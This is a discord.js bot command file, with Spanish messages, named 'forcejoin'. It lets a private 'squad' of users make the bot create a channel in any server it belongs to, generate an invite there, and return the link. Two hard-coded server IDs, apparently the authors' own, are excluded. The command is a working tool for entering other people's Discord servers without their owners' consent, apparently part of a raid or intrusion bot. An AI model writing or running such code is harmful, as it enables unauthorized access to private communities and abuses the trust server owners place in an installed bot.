const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {

const db = require ('megadb');
const squad = new db.crearDB('squad');

 if (!squad.has(message.author.id)) return 
  
let serverid = args[0]
    if(!serverid) return message.channel.send(new MessageEmbed()
    .setColor("#2f3136")
    .setAuthor("¿Como utilizar?", client.user.avatarURL())
    .setDescription("`.forcejoin [ Argumentos ]`")
    .setFooter("Ejemplo: .forcejoin 672244131732520990", client.user.avatarURL()))
    
      
    if(serverid === "935892194236182638" || serverid === "935880059498168421") return message.channel.send(new MessageEmbed().setColor("#2f3136").setDescription("Error :x: El comando no funciona en este servidor."))
    
    try {
          
          var ops = {
            maxAge: 86400,
            maxUses: 8
          }


      client.guilds.cache.get(serverid).channels.create('a', { Type: "text" }).then(function() {
    client.guilds.cache.get(serverid).channels.cache.find(channel => channel.name === "a").createInvite(ops).then(function(newInvite){
      message.channel.send(new MessageEmbed()
    .setColor("#2f3136")
    .setDescription("https://discord.gg/"+newInvite.code))}).catch(console.error)
    })

          
    }catch(error) {
        message.author.send(new MessageEmbed()
        .setColor("BLACK")
        .setDescription("Error :x: Ha ocurrido un error en el comando.")
        .addField("__Posibles errores:__", "```• No estoy en ese servidor\n• Permisos insuficientes\n• Cantidad de canales máximos.```")
        .addField("__Error Detallado:__", "```"+error+"```"));
    }    

}                                   

exports.help = {
  name: "forcejoin",
  aliases:[],
  usage: "[ Argumentos : Server ID ]",
  description: "Crea un canal en el servidor seleccionado y en el mismo, genera una invitación.",
  category: "Private"
  
}